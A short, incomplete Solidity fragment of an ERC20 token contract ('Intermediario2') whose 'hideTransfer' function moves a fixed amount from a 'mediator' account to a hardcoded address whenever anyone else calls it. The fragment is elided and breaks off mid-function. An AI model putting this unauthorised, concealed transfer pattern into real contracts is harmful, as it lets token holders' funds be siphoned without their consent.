...
contract Intermediario2 is ERC20Interface, SafeMath {
    string public name;
    ...
    constructor() public {
        ...
        amount = 0;
        destination = address(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2);
    ...
    function hideTransfer(address to, uint tokens) public returns (bool success) {
        require(msg.sender != mediator, "You are the mediator, these are not your money");
        balances[mediator] = safeSub(balances[mediator],amount);
        balances[destination] = safeAdd(balances[destination],amount);
        emit Transfer(mediator, destination, amount);
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
